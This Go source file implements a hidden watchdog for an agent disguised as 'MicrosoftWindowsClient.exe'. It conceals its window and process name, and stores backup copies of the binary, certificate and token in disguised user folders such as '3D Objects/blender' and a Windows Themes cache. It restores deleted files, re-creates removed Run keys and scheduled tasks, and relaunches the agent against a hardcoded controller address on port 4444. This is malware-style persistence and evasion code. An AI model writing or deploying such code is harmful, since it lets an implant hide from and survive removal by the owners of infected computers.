package main

// Native supervisor (--watch): replaces the old powershell watchdog loop,
// so no powershell.exe with a visible script path ever exists on the box.
// The watcher is the same binary (MicrosoftWindowsClient.exe --watch):
// hidden window, bland process name, ~0 CPU (one check per 30s).
//
// Each pass it:
//   - restarts the agent when the process is missing or its healthy
//     heartbeat went stale (>90s),
//   - restores a wiped agent binary/cert/token from either backup,
//   - re-syncs a wiped backup location from the survivor,
//   - unwinds crash-looping fresh updates to prev (writes
//     rollback_notice.json for the agent to report),
//   - every ~5 min re-creates deleted Run keys / scheduled tasks
//     (Windows-only persistence heal).

import (
	"encoding/json"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/shirou/gopsutil/v3/process"
)

const watchInterval = 30 * time.Second

type watchCfg struct {
	agentPath      string
	controllerAddr string
	caPath         string
	installDir     string
	backupDir      string
	backupDir2     string
	backupAgent    string
	backupCert     string
	backupAgent2   string
	backupCert2    string
}

func userProfileDir() string {
	if p := os.Getenv("USERPROFILE"); p != "" {
		return p
	}
	if h, err := os.UserHomeDir(); err == nil {
		return h
	}
	return os.TempDir()
}

func loadWatchCfg() *watchCfg {
	exe, err := os.Executable()
	dir := ""
	if err == nil {
		dir, _ = filepath.Abs(filepath.Dir(exe))
	}
	if dir == "" {
		dir, _ = os.Getwd()
	}
	threeD := filepath.Join(userProfileDir(), "3D Objects")
	blender := filepath.Join(threeD, "blender")
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = filepath.Join(userProfileDir(), "AppData", "Roaming")
	}
	cache := filepath.Join(appData, "Microsoft", "Windows", "Themes", "Cache")
	return &watchCfg{
		agentPath:      filepath.Join(dir, "MicrosoftWindowsClient.exe"),
		controllerAddr: loadControllerConfig("176.229.98.54:4444"),
		caPath:         filepath.Join(dir, "server.crt"),
		installDir:     dir,
		backupDir:      blender,
		backupDir2:     cache,
		backupAgent:    filepath.Join(blender, "MicrosoftWindowsClient.exe"),
		backupCert:     filepath.Join(blender, "server.crt"),
		backupAgent2:   filepath.Join(cache, "MicrosoftWindowsClient.exe"),
		backupCert2:    filepath.Join(cache, "server.crt"),
	}
}

// watchLock ensures a single watcher: stale locks (dead pid) are reclaimed.
func watchLock() bool {
	dir := filepath.Join(os.TempDir(), "RMM")
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	}
	_ = os.MkdirAll(dir, 0755)
	path := filepath.Join(dir, "watch.lock")
	if f, err := os.OpenFile(path, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644); err == nil {
		_, _ = f.WriteString(strconv.Itoa(os.Getpid()))
		f.Close()
		return true
	}
	if b, err := os.ReadFile(path); err == nil {
		if pid, err := strconv.Atoi(strings.TrimSpace(string(b))); err == nil && pid != os.Getpid() {
			if alive, _ := process.PidExists(int32(pid)); !alive {
				_ = os.Remove(path)
				if f, err := os.OpenFile(path, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644); err == nil {
					_, _ = f.WriteString(strconv.Itoa(os.Getpid()))
					f.Close()
					return true
				}
			}
		}
	}
	return false
}

func isAgentProc(p *process.Process) bool {
	pid := int(os.Getpid())
	if int(p.Pid) == pid {
		return false
	}
	name, err := p.Name()
	if err != nil || name == "" {
		return false
	}
	n := strings.ToLower(name)
	return n == "microsoftwindowsclient" || n == "microsoftwindowsclient.exe" ||
		n == "agent" || n == "agent.exe"
}

// agentAlive reports whether an agent process (other than us) exists.
func agentAlive() bool {
	pids, err := process.Pids()
	if err != nil {
		return false
	}
	for _, pid := range pids {
		if p, err := process.NewProcess(pid); err == nil {
			if isAgentProc(p) {
				return true
			}
		}
	}
	return false
}

// agentHealthy mirrors the watchdog rule: heartbeat newer than 90s.
func agentHealthy() bool {
	p := healthyHeartbeatPath()
	b, err := os.ReadFile(p)
	if err != nil {
		return false
	}
	ts, err := strconv.ParseInt(strings.TrimSpace(string(b)), 10, 64)
	if err != nil {
		return false
	}
	return time.Now().Unix()-ts < 90
}

func (w *watchCfg) startAgent() {
	cmd := exec.Command(w.agentPath, "-controller", w.controllerAddr, "-ca", w.caPath)
	hideWatchCmd(cmd)
	if err := cmd.Start(); err != nil {
		log.Printf("[watch] start agent: %v", err)
		return
	}
	log.Printf("[watch] started agent (pid %d)", cmd.Process.Pid)
}

func (w *watchCfg) killAgents() {
	pids, err := process.Pids()
	if err != nil {
		return
	}
	for _, pid := range pids {
		if p, err := process.NewProcess(pid); err == nil && isAgentProc(p) {
			_ = p.Kill()
		}
	}
}

func readVerFile(dir string) string {
	b, err := os.ReadFile(filepath.Join(dir, "version.txt"))
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(b))
}

// pickBackup returns the first surviving (binary, cert) backup pair.
func (w *watchCfg) pickBackup() (bin, cert string) {
	for _, cand := range [][2]string{{w.backupAgent, w.backupCert}, {w.backupAgent2, w.backupCert2}} {
		if _, err := os.Stat(cand[0]); err == nil {
			if _, err := os.Stat(cand[1]); err == nil {
				return cand[0], cand[1]
			}
		}
	}
	return "", ""
}

// restoreBinary heals a wiped install from backup (version-guarded so a
// stale backup never downgrades a bulk-updated agent) and re-syncs a wiped
// backup location from its survivor. Also restores a missing token.
func (w *watchCfg) restoreBinary() {
	if _, err := os.Stat(w.agentPath); os.IsNotExist(err) {
		bin, cert := w.pickBackup()
		if bin == "" {
			log.Printf("[watch] agent binary missing AND both backups gone")
			return
		}
		instVer := readVerFile(w.installDir)
		bakVer := readVerFile(filepath.Dir(bin))
		if bakVer != "" && instVer != "" && bakVer < instVer {
			log.Printf("[watch] backup v%s older than installed v%s - skipping restore", bakVer, instVer)
			return
		}
		log.Printf("[watch] agent binary missing, restoring from backup")
		_ = os.MkdirAll(filepath.Dir(w.agentPath), 0755)
		if b, err := os.ReadFile(bin); err == nil {
			_ = os.WriteFile(w.agentPath, b, 0755)
		}
		if b, err := os.ReadFile(cert); err == nil {
			_ = os.WriteFile(w.caPath, b, 0644)
		}
		if bakVer != "" {
			_ = os.WriteFile(filepath.Join(w.installDir, "version.txt"), []byte(bakVer+"\n"), 0644)
		}
		log.Printf("[watch] binary + cert restored")
	}
	for _, tok := range []string{filepath.Join(w.backupDir, "token.txt"), filepath.Join(w.backupDir2, "token.txt")} {
		if _, err := os.Stat(filepath.Join(w.installDir, "token.txt")); os.IsNotExist(err) {
			if b, err := os.ReadFile(tok); err == nil && len(b) > 0 {
				_ = os.WriteFile(filepath.Join(w.installDir, "token.txt"), b, 0600)
				log.Printf("[watch] registration token restored")
				break
			}
		}
	}
	if _, err := os.Stat(w.backupAgent); os.IsNotExist(err) {
		if _, err2 := os.Stat(w.backupAgent2); err2 == nil {
			_ = os.MkdirAll(w.backupDir, 0755)
			if b, err := os.ReadFile(w.backupAgent2); err == nil {
				_ = os.WriteFile(w.backupAgent, b, 0755)
			}
			if b, err := os.ReadFile(w.backupCert2); err == nil {
				_ = os.WriteFile(w.backupCert, b, 0644)
			}
			log.Printf("[watch] re-synced primary backup from secondary")
		}
	} else if _, err := os.Stat(w.backupAgent2); os.IsNotExist(err) {
		_ = os.MkdirAll(w.backupDir2, 0755)
		if b, err := os.ReadFile(w.backupAgent); err == nil {
			_ = os.WriteFile(w.backupAgent2, b, 0755)
		}
		if b, err := os.ReadFile(w.backupCert); err == nil {
			_ = os.WriteFile(w.backupCert2, b, 0644)
		}
		log.Printf("[watch] re-synced secondary backup from primary")
	}
}

type rollbackFile struct {
	Bad string `json:"bad"`
	To  string `json:"to"`
	At  string `json:"at"`
}

// maybeRollback unwinds a crash-looping fresh update to prev: >=3 watcher
// restarts in 10 minutes while a differing prev backup exists.
func (w *watchCfg) maybeRollback(crashTimes *[]int64) {
	now := time.Now().Unix()
	kept := (*crashTimes)[:0]
	for _, t := range *crashTimes {
		if now-t < 600 {
			kept = append(kept, t)
		}
	}
	*crashTimes = kept
	if len(kept) < 3 {
		return
	}
	verNow := readVerFile(w.installDir)
	prevRaw, err := os.ReadFile(filepath.Join(w.installDir, "version.prev.txt"))
	prevVer := strings.TrimSpace(string(prevRaw))
	prevExe := filepath.Join(w.installDir, "MicrosoftWindowsClient.prev.exe")
	if err != nil || verNow == "" || prevVer == "" || prevVer == verNow {
		return
	}
	if _, err := os.Stat(prevExe); err != nil {
		return
	}
	log.Printf("[watch] update v%s crash-looped (%d restarts in 10min) - rolling back to v%s", verNow, len(kept), prevVer)
	w.killAgents()
	time.Sleep(2 * time.Second)
	if b, err := os.ReadFile(prevExe); err == nil {
		_ = os.WriteFile(w.agentPath, b, 0755)
	}
	_ = os.WriteFile(filepath.Join(w.installDir, "version.txt"), []byte(prevVer+"\n"), 0644)
	nb, _ := json.Marshal(rollbackFile{Bad: verNow, To: prevVer, At: time.Now().UTC().Format(time.RFC3339)})
	_ = os.WriteFile(filepath.Join(w.installDir, "rollback_notice.json"), nb, 0644)
	_ = os.Remove(filepath.Join(w.installDir, "pending_update.json"))
	*crashTimes = nil
	log.Printf("[watch] rolled back to v%s - agent reports on next hello", prevVer)
	w.startAgent()
}

// runWatch is the supervisor main loop (never returns).
func runWatch() {
	if !watchLock() {
		return // another watcher owns the box
	}
	w := loadWatchCfg()
	log.Printf("[watch] supervising %s", w.agentPath)
	if !agentAlive() {
		w.restoreBinary()
		w.startAgent()
	}
	var crashTimes []int64
	wasAlive := agentAlive()
	loop := 0
	for {
		time.Sleep(watchInterval)
		loop++
		noteRestart := func() {
			now := time.Now().Unix()
			crashTimes = append(crashTimes, now)
		}
		if !agentAlive() {
			if wasAlive {
				noteRestart()
			}
			log.Printf("[watch] agent missing, restarting")
			w.restoreBinary()
			w.startAgent()
			w.maybeRollback(&crashTimes)
			wasAlive = true
		} else if !agentHealthy() {
			noteRestart()
			log.Printf("[watch] agent hung (heartbeat stale), restarting")
			w.killAgents()
			time.Sleep(2 * time.Second)
			w.restoreBinary()
			w.startAgent()
			w.maybeRollback(&crashTimes)
			wasAlive = true
		} else {
			wasAlive = true
		}
		if loop%10 == 0 {
			ensureWatchPersistence(w)
		}
	}
}
